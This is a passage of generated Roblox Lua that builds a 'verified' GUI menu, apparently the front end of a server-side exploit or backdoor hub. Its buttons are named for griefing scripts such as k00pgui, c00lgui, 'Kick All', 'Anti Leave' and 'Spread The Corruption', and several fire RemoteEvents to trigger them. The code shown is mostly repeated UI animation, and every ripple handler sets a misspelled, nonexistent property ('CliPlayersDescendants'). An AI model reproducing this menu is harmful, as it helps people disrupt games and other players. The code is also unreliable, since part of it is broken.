G2L["413"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["413"].Text = [[Open VerifiedGui🤑]]
G2L["413"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["413"].TextScaled = true
G2L["413"].TextSize = 14
G2L["413"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["413"].TextStrokeTransparency = 1
G2L["413"].TextWrapped = true
G2L["413"].TextXAlignment = Enum.TextXAlignment.Center
G2L["413"].TextYAlignment = Enum.TextYAlignment.Center
G2L["413"].Active = true
G2L["413"].AnchorPoint = Vector2.new(0, 0)
G2L["413"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["413"].BackgroundTransparency = 0
G2L["413"].BorderColor3 = Color3.fromRGB(0, 0, 0)
G2L["413"].BorderSizePixel = 0
G2L["413"].ClipsDescendants = false
G2L["413"].Draggable = false
G2L["413"].Position = UDim2.new(9.986677, 0, 1.6022204, 0)
G2L["413"].Rotation = 6
G2L["413"].Selectable = true
G2L["413"].SelectionOrder = 0
G2L["413"].Size = UDim2.new(0, 215, 0, 69)
G2L["413"].Visible = true
G2L["413"].ZIndex = 1
G2L["413"].Parent = G2L["1"]

--verified.Frame.Open.LocalScript
G2L["414"].Name = [[LocalScript]]
G2L["414"].Parent = G2L["413"]

--[[
    Scripts
--]]
--verified.Frame.ImageLabel.Dragify
local function C_G2L_3()
local script = G2L["3"]
local UIS = game:GetService("UserInputService")
function dragify(Frame)
    dragToggle = nil
    local dragSpeed = 0
    dragInput = nil
    dragStart = nil
    local dragPos = nil
    function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
    end
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input == dragInput and dragToggle then
            updateInput(input)
        end
    end)
end

dragify(script.Parent)
end
task.spawn(C_G2L_3)


--verified.Frame.ImageLabel.Tween
local function C_G2L_4()
local script = G2L["4"]
script.Parent:TweenPosition(UDim2.new(0.488, 0,0.0, 243))
script.Parent.Visible = true

end
task.spawn(C_G2L_4)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.RippleClick
local function C_G2L_16()
local script = G2L["16"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_16)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.RippleClick
local function C_G2L_26()
local script = G2L["26"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_26)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.RippleClick
local function C_G2L_36()
local script = G2L["36"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_36)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.RippleClick
local function C_G2L_46()
local script = G2L["46"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_46)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.RippleClick
local function C_G2L_56()
local script = G2L["56"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_56)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.RippleClick
local function C_G2L_66()
local script = G2L["66"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_66)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.LocalScript
local function C_G2L_73()
local script = G2L["73"]
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.RemoteEvent:FireServer()
end)
end
task.spawn(C_G2L_73)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.RippleClick
local function C_G2L_78()
local script = G2L["78"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_78)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.RippleClick
local function C_G2L_88()
local script = G2L["88"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_88)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.RippleClick
local function C_G2L_98()
local script = G2L["98"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_98)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.RippleClick
local function C_G2L_108()
local script = G2L["108"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_108)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.RippleClick
local function C_G2L_126()
local script = G2L["126"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_126)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.RippleClick
local function C_G2L_136()
local script = G2L["136"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_136)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.LocalScript
local function C_G2L_145()
local script = G2L["145"]
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.RemoteEvent:FireServer()
end)
end
task.spawn(C_G2L_145)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.RippleClick
local function C_G2L_148()
local script = G2L["148"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_148)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.RippleClick
local function C_G2L_158()
local script = G2L["158"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_158)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.RippleClick
local function C_G2L_177()
local script = G2L["177"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_177)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.RippleClick
local function C_G2L_186()
local script = G2L["186"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_186)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.RippleClick
local function C_G2L_197()
local script = G2L["197"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_197)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.RippleClick
local function C_G2L_215()
local script = G2L["215"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_215)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.RippleClick
local function C_G2L_225()
local script = G2L["225"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_225)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.LocalScript
local function C_G2L_241()
local script = G2L["241"]
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.RemoteEvent:FireServer()
end)
end
task.spawn(C_G2L_241)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.RippleClick
local function C_G2L_245()
local script = G2L["245"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
